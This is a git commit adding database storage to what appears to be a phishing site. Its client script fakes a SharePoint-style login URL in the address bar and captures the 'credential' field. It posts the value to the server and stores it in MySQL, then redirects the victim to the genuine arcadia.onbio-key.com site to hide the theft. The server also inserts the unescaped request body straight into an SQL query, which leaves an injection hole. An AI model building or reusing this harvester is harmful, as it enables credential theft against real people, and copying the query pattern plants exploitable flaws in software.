66d97c6acb0bce9ed49782fe80d760e377b0e8de
Adamspera <adamspera@hotmail.com>
2022-09-21 19:10:01 +0000

    Add database integration

--- app.js
+++ app.js
@@ -1,5 +1,22 @@
+require('dotenv').config();
 var express = require('express');
+var mysql = require('mysql');
 var app = express();
+
+var connection = mysql.createConnection({
+  host: process.env.HOST,
+  user: process.env.MYSQLUSERNAME,
+  password: process.env.PASSWORD,
+  database: process.env.DATABASE
+});
+
+connection.connect(function (error) {
+  if (!!error) {
+    console.log(error);
+  } else {
+    console.log('Database Connected');
+  }
+})
 
 app.use(express.static('public'));
 app.listen(80, '0.0.0.0', function () {
@@ -9,4 +26,22 @@ app.listen(80, '0.0.0.0', function () {
 app.get('/', function (req, res) {
   console.log(`[/]: Get request received at '/'`);
   res.sendFile('public/index.html', { root: __dirname });
+})
+
+app.post('/data', (req, res) => {
+  let body = ''; req.on('data', function (chunk) { body += chunk; });
+  req.on('end', function () {
+    console.log(`[/data]: Post request received at '/data' (${body})`);
+
+    connection.query(`INSERT INTO ${process.env.DATABASE}.${process.env.TABLE} (email) VALUES (${body});`, function (error, result, field) {
+      if (!!error) {
+        console.log('[/data]: There was an issue saving data'); console.log(error);
+        res.send('Failed');
+      } else {
+        console.log('[/data]: Success saving data!'); console.log(result);
+        res.send('Confirmed');
+      }
+    });
+
+  })
 })
--- public/javascript/index.js
+++ public/javascript/index.js
@@ -1,9 +1,11 @@
 window.history.pushState("https://arcadia.onbio-key.com/", "", '/_layouts/PG/login.aspx?ReturnUrl=%2f');
 
 document.getElementById("submitButton").addEventListener('click', function () {
-  var useremail = document.getElementById("credential").value
 
-  console.log(useremail)
-  
-  location.href = "https://arcadia.onbio-key.com";
+  fetch('/data', { method: 'POST', body: document.getElementById("credential").value })
+    .then(response => response.text())
+    .then(text => {
+      location.href = "https://arcadia.onbio-key.com";
+    })
+
 });
